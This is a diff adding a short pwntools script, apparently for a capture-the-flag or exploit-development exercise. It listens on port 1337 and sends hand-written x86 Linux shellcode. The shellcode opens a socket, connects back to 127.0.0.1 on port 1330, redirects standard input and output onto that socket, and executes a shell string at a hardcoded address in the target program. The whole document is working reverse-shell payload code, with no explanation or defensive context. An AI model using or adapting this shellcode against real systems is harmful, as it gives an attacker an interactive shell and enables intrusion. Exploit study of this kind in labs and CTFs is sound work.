@@ -1,0 +1,49 @@
+from pwn import *
+
+l = listen(port=1337)
+r = l.wait_for_connection()
+
+sh = """
+push 0x0
+push 0x1
+push 0x2
+push 0x66
+pop eax
+push 0x1
+pop ebx
+mov ecx,esp
+int 0x80
+push 0x0100007f
+push 0x32050002
+mov ecx,esp
+push 0x10
+push ecx
+push eax
+mov al,0x66
+push 0x3
+pop ebx
+mov ecx,esp
+int 0x80
+mov al,0x3f
+mov ebx,0x4
+mov ecx,0x0
+int 0x80
+mov al,0x3f
+mov ebx,0x4
+mov ecx,0x1
+int 0x80
+mov al,0x3f
+mov ebx,0x4
+mov ecx,0x2
+int 0x80
+mov al,0xb
+xor ecx,ecx
+mov edx,ecx
+mov ebx,0x0804ad28
+int 0x80
+"""
+
+shell = asm(sh)
+
+r.send(shell)
+
